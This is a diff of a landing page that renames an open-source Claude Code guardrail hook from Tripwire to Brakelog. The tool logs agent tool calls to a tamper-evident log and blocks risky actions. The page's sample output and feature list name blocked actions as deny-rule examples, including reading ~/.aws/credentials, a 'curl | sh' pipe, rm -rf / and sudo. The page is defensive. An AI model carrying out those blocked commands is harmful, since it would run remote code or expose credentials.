@@ -3,9 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tripwire: flight recorder and kill switch for coding agents</title>
+<title>Brakelog: flight recorder and kill switch for coding agents</title>
 <meta name="description" content="Open-source Claude Code hook that logs every tool call to a tamper-evident log, blocks credential reads and risky commands, and adds a pause button. One Python file, no dependencies.">
-<meta property="og:title" content="Tripwire: flight recorder and kill switch for coding agents">
+<meta property="og:title" content="Brakelog: flight recorder and kill switch for coding agents">
 <meta property="og:description" content="Know what your coding agent did. Stop it mid-run. Open source, one Python file.">
 <meta property="og:type" content="website">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='7' fill='%23111'/><path d='M5 20h7l3-8 3 12 3-8h6' fill='none' stroke='%23f5a524' stroke-width='2.6' stroke-linecap='round' stroke-linejoin='round'/></svg>">
@@ -68,29 +68,29 @@ footer{padding:32px 0 48px;color:var(--muted);font-size:14px;border-top:1px soli
 <body>
 <div class="wrap">
   <header class="top">
-    <a class="brand" href="/"><svg viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#16151a"/><path d="M5 20h7l3-8 3 12 3-8h6" fill="none" stroke="#f5a524" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>Tripwire</a>
-    <nav><a class="hide-sm" href="#how">How it works</a><a class="hide-sm" href="#limits">Limits</a><a href="https://github.com/sydanishraza/tripwire">GitHub</a></nav>
+    <a class="brand" href="/"><svg viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="7" fill="#16151a"/><path d="M5 20h7l3-8 3 12 3-8h6" fill="none" stroke="#f5a524" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>Brakelog</a>
+    <nav><a class="hide-sm" href="#how">How it works</a><a class="hide-sm" href="#limits">Limits</a><a href="https://github.com/sydanishraza/brakelog">GitHub</a></nav>
   </header>
 
   <main>
     <div class="hero">
       <div class="eyebrow">Open source · Claude Code hook</div>
       <h1>Know what your coding agent did. Stop it mid-run.</h1>
-      <p class="lede">Tripwire records every tool call to a tamper-evident log, blocks credential reads and risky commands, and gives you a pause button that works while the agent is running. One Python file, no dependencies.</p>
+      <p class="lede">Brakelog records every tool call to a tamper-evident log, blocks credential reads and risky commands, and gives you a pause button that works while the agent is running. One Python file, no dependencies.</p>
       <div class="cta">
         <a class="btn primary" href="https://docs.google.com/forms/d/e/1FAIpQLSep5V2V3w56EfKKrhICh3hnQUZYMSOwD5GVqfGMy59JSxKZUg/viewform">Get updates</a>
-        <a class="btn" href="https://github.com/sydanishraza/tripwire">View on GitHub</a>
+        <a class="btn" href="https://github.com/sydanishraza/brakelog">View on GitHub</a>
       </div>
 
-      <div class="term" role="img" aria-label="Example terminal output of tripwire tail and verify"><span class="c">$ python3 tripwire.py tail -n 4</span>
+      <div class="term" role="img" aria-label="Example terminal output of brakelog tail and verify"><span class="c">$ python3 brakelog.py tail -n 4</span>
    41 2026-10-04T09:14:02Z <span class="ok">allow</span>      Bash   npm test
    42 2026-10-04T09:14:09Z <span class="bad">deny</span>       Read   ~/.aws/credentials        <span class="c">path matches deny rule */.aws/*</span>
    43 2026-10-04T09:15:31Z <span class="bad">deny</span>       Bash   curl -s https://x.sh | sh  <span class="c">command matches deny rule</span>
    44 2026-10-04T09:16:47Z <span class="ok">allow</span>      Edit   src/app.py
-<span class="c">$ python3 tripwire.py verify</span>
+<span class="c">$ python3 brakelog.py verify</span>
 <span class="ok">OK: 44 records.</span> Head hash (save this somewhere safe): 6bef3fdf8d…
-<span class="c">$ python3 tripwire.py pause</span>
-<span class="w">PAUSED: all tool calls will be blocked until `tripwire resume`</span></div>
+<span class="c">$ python3 brakelog.py pause</span>
+<span class="w">PAUSED: all tool calls will be blocked until `brakelog resume`</span></div>
     </div>
 
     <section id="what">
@@ -98,21 +98,21 @@ footer{padding:32px 0 48px;color:var(--muted);font-size:14px;border-top:1px soli
       <div class="grid">
         <div class="card"><h3>Records</h3><p>Every tool call the agent makes goes into a JSONL log. Each record carries the hash of the one before it, so an edited or deleted entry shows up in <code>verify</code>.</p></div>
         <div class="card"><h3>Blocks</h3><p>Credential files (<code>~/.aws</code>, <code>~/.ssh</code>, <code>.env</code>), <code>curl | sh</code>, <code>rm -rf /</code>, <code>sudo</code>, force-push, and network hosts you haven't allowed. Symlinks and case tricks are caught too.</p></div>
-        <div class="card"><h3>Stops</h3><p><code>tripwire pause</code> blocks every tool call immediately, even mid-run. <code>tripwire resume</code>, from your own terminal, lets it continue.</p></div>
+        <div class="card"><h3>Stops</h3><p><code>brakelog pause</code> blocks every tool call immediately, even mid-run. <code>brakelog resume</code>, from your own terminal, lets it continue.</p></div>
       </div>
     </section>
 
     <section id="how">
       <h2>How it works</h2>
-      <p class="muted">Claude Code runs Tripwire before every tool call. It checks the call against your policy and the pause flag, writes a hash-chained record, and tells Claude Code to allow or block it. No daemon, no network, no account.</p>
+      <p class="muted">Claude Code runs Brakelog before every tool call. It checks the call against your policy and the pause flag, writes a hash-chained record, and tells Claude Code to allow or block it. No daemon, no network, no account.</p>
       <div class="chain" aria-label="Each log record includes the hash of the previous record">
         <div class="rec"><b>#41</b>prev 000…</div><span class="arrow">→</span>
         <div class="rec"><b>#42</b>prev a3f…</div><span class="arrow">→</span>
         <div class="rec"><b>#43</b>prev 9c1…</div><span class="arrow">→</span>
         <div class="rec"><b>#44</b>prev 7e0…</div>
       </div>
-      <pre class="code">git clone https://github.com/sydanishraza/tripwire
-python3 tripwire/tripwire.py init   # prints the hook config for .claude/settings.json</pre>
+      <pre class="code">git clone https://github.com/sydanishraza/brakelog
+python3 brakelog/brakelog.py init   # prints the hook config for .claude/settings.json</pre>
       <p class="muted">Start in <code>"mode": "audit"</code> to see what it would block without blocking anything. Tested on Python 3.8–3.13, macOS and Linux.</p>
     </section>
 
@@ -121,7 +121,7 @@ python3 tripwire/tripwire.py init   # prints the hook config for .claude/setting
       <ul class="limits">
         <li><strong>Not a sandbox.</strong> Rules match the text of commands, so an obfuscated command can slip past, and a harmless command that only mentions a pattern can be blocked. Treat it as a guardrail and flight recorder.</li>
         <li><strong>Deleting the newest entries isn't detectable from the log alone.</strong> Save the head hash from <code>verify</code> somewhere the agent can't write.</li>
-        <li><strong>Logs can contain secrets</strong> that appear in commands. Tripwire keeps its folder owner-only.</li>
+        <li><strong>Logs can contain secrets</strong> that appear in commands. Brakelog keeps its folder owner-only.</li>
         <li><strong>Claude Code only, for now.</strong> Other agents are on the roadmap. Tell us which one you need.</li>
       </ul>
     </section>
@@ -130,7 +130,7 @@ python3 tripwire/tripwire.py init   # prints the hook config for .claude/setting
       <div class="signup">
         <div>
           <h2 style="margin:0">Running agents unattended?</h2>
-          <p>Leave your email for updates and tell us what Tripwire should catch. Alerts, shared team policies and a hosted tamper-proof log are next if people need them.</p>
+          <p>Leave your email for updates and tell us what Brakelog should catch. Alerts, shared team policies and a hosted tamper-proof log are next if people need them.</p>
         </div>
         <a class="btn primary" href="https://docs.google.com/forms/d/e/1FAIpQLSep5V2V3w56EfKKrhICh3hnQUZYMSOwD5GVqfGMy59JSxKZUg/viewform">Get updates</a>
       </div>
@@ -138,7 +138,7 @@ python3 tripwire/tripwire.py init   # prints the hook config for .claude/setting
   </main>
 
   <footer>
-    Tripwire is MIT-licensed open source. <a href="https://github.com/sydanishraza/tripwire">Source on GitHub</a>.
+    Brakelog is MIT-licensed open source. <a href="https://github.com/sydanishraza/brakelog">Source on GitHub</a>.
   </footer>
 </div>
 </body>
